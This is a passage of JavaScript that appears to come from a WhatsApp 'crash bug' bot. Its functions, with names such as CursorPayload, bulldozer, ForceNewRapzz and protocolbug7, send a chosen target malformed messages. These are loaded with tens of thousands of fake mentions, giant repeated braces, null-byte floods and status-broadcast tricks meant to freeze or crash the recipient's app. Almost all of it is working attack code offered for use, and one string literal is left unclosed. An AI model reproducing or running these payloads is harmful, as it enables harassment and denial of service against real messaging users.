            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(target, audioMessage, {});

    // Relay all messages
    for (const msg of [msg1, msg2, msg3]) {
        await IqbalXpn.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await IqbalXpn.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
        console.log(chalk.green.bold("SUCCESS PROTOCOLBUG8"));
    }
}

async function CursorPayload(target) {
console.log(chalk.red("Proses Sending Bug...."));
  try {
    const nativeFlowPayload = "{".repeat(10000);
    const quotedViewOnce = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "𝘌𝘷𝘰𝘶𝘳𝘵𝘩 𝘛𝘩𝘦 𝘌𝘳𝘢 𝘐𝘴 𝘉𝘢𝘤𝘬" },
            nativeFlowMessage: {
              messageParamsJson: nativeFlowPayload,
            },
            contextInfo: {
              mentionedJid: [
                ...Array.from({ length: 30000 }, () =>
                  `${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`
                ),
              ],
            },
          },
        },
      },
    };

    const finalPayload = {
      ephemeralMessage: {
        message: {
          imageMessage: {
            mimetype: 'image/jpeg',
            caption: '𝘌𝘷𝘰𝘶𝘳𝘵𝘩 𝘛𝘩𝘦 𝘌𝘳𝘢 𝘐𝘴 𝘉𝘢𝘤𝘬',
            jpegThumbnail: null,
            contextInfo: {
              quotedMessage: quotedViewOnce,
              forwardingScore: 9999,
              isForwarded: true,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 20000 }, () =>
                  `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
                ),
              ],
            },
          },
        },
      },
    };

    await IqbalXpn.relayMessage(target, finalPayload, {
      messageId: undefined,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.error("❌ Crash Payload Failed:", err);
  }
}
async function bulldozer(target) {
console.log(chalk.red("Proses Sending Bug...."));
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 900000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


  await IqbalXpn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function ForceNewRapzz(target, mentionedList = []) {
    const client = this; 
    
    const message = {
        botInvokeMessage: {
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: '666@newsletter',
                    newsletterName: "ꦾ".repeat(60000),
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiMicoH/2gAMAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
                    caption: "ꦾ".repeat(90000),
                    inviteExpiration: Date.now() + 0x99999999999abcdef,
                },
            },
        },
        nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: [
                {
                    name: "mpm",
                    buttonParamsJson: "\u0000".repeat(808808)
                },
                {
                    name: "single_select",
                    buttonParamsJson: "{\"title\":\"" + "ྀ".repeat(77777) + "ྀ".repeat(77777) + "\",\"sections\":[{\"title\":\"" + "ྀ".repeat(77777) + "\",\"rows\":[]}]}"
                },
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({ status: "1" })
                },
                {
                    name: "call_permission_request",
                    buttonParamsJson: "{".repeat(808808)
                }
            ]
        },
        nativeFlowInfo: {
            name: "galaxy_message",
            paramsJson: "\u0003".repeat(9999)
        },
        carouselMessage: {
            cards: Array.from({ length: 200 }, () => ({
                cardHeader: {
                    title: "\u0000".repeat(999),
                    subtitle: "ARYA X NEMO ( 𝐂𝐨𝐫𝐞𝟗𝟗𝟗 )",
                    thumbnail: Buffer.alloc(1024 * 32).fill(0)
                },
                cardContent: {
                    title: "\u0000",
                    description: "\n".repeat(500)
                },
                buttons: [
                    { name: "call_permission_request", buttonParamsJson: "\u0000" + Rapzfvckworld  },
                    { name: "mpm", buttonParamsJson: "{".repeat(1000) + Rapzfvckworld  },
                    { name: "single_select", buttonParamsJson: "" }
                ]
            }))
        },
        contextInfo: {
            remoteJid: target,
            participant: target,
            mentionedJid: mentionedList,
            stanzaId: client.generateMessageTag(),
            businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
            },
            expiration: 9741,
            ephemeralSettingTimestamp: 9741,
            entryPointConversionSource: "WhatsApp.com",
            entryPointConversionApp: "WhatsApp",
            entryPointConversionDelaySeconds: 9742,
            disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING"
            },
            quotedMessage: {
                ephemeralMessage: {
                    message: {
                        viewOnceMessage: {
                            message: {
                                ephemeralSettingRequestMessage: {
                                    ephemeralDuration: 0
                                },
                                orderMessage: {
                                    itemCount: 99999999
                                }
                            }
                        }
                    }
                }
            }
        },
    };

    await client.sendMessage(target, message);

    await IqbalXpn.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: 'ARYA X NEMO ꦾ '
            },
            header: {
                hasMediaAttachment: true,
                jpegThumbnail:  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiMicoH/2gAMAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=, 
                contextInfo: {
                    participant: target
                }
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "payment_method",
                        buttonParamsJson: "{}"
                    }
                ]
            }
        }
    }, {
        participant: { jid: target },
        additionalNodes: [
            {
                tag: 'biz',
                attrs: { native_flow_name: 'payment_method' }
            }
        ]
    });
}

async function FlowX(target) {
console.log(chalk.red("Proses Sending Bug...."));
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "⛧ RyzzXajaBang",
              hasMediaAttachment: false,
            },
            body: {
              text: "\u0000",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    },
    {}
  );

  await IqbalXpn.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
async function invisSqL(target) {
console.log(chalk.red("Proses Sending Bug...."));
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [target],
                participant: target,
                remoteJid: target,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  }, {});

  await IqbalXpn.relayMessage(target, msg.message, {
    participant: { jid: target },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}
async function protocolbug7(target, mention) {
  const mentionedJids = [
    ...Array.from({ length: 40000 }, () =>
      `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "1@newsletter",
      serverMessageId: 1,
      newsletterName: "ꦾ".repeat(99)
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await IqbalXpn.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await IqbalXpn.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}
async function OtaDelay(target) {
  const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: target,
      fromMe: true,
      id: (new Date().getTime()).toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: 'image/webp',
        fileSha256: Buffer.from([
          187, 146, 22, 50, 195, 167, 208, 126,
          9, 85, 68, 142, 83, 49, 94, 118,
          1, 203, 45, 28, 56, 91, 122, 225,
          139, 174, 84, 97, 202, 226, 252, 163
        ]),
        fileEncSha256: Buffer.from([
          1, 254, 7, 45, 33, 43, 134, 167,
          251, 8, 52, 166, 190, 90, 18, 147,
          250, 143, 80, 250, 190, 46, 203, 103,
          130, 205, 132, 101, 235, 40, 60, 22
        ]),
        mediaKey: Buffer.from([
          234, 34, 50, 200, 155, 222, 255, 16,
          171, 221, 14, 53, 40, 212, 205, 246,
          163, 9, 7, 35, 191, 155, 107, 246,
          33, 191, 184, 168, 105, 109, 140, 184
        ]),
        fileLength: { low: 3304, high: 0, unsigned: true },
        directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
        mediaKeyTimestamp: { low: 1746262763, high: 0, unsigned: false },
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid
        }
      }
    }
  };

  await IqbalXpn.relayMessage(target, stickerMsg.message, { messageId: stickerMsg.key.id });
}
async function FlowXNull(target) {
  const MSG = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "⛧ 𝑅𝐴𝐿𝐷𝑍𝑍 𝑋𝑃𝐿𝑂𝐼𝑇 ⛧  \n" + 
                 "@0@1".repeat(30000),
            format: "DEFAULT",
            contextInfo: {
              mentionedJid: [
                target,
                "0@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING"
              },
            }
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message", // can changed to "call_permission_request" 
            paramsJson: "{".repeat(50000) + "}".repeat(50000), 
            version: 3
          }
        }
      }
    }
  };

  await IqbalXpn.relayMessage(target, MSG, {
    participant: { jid: target }
  });
}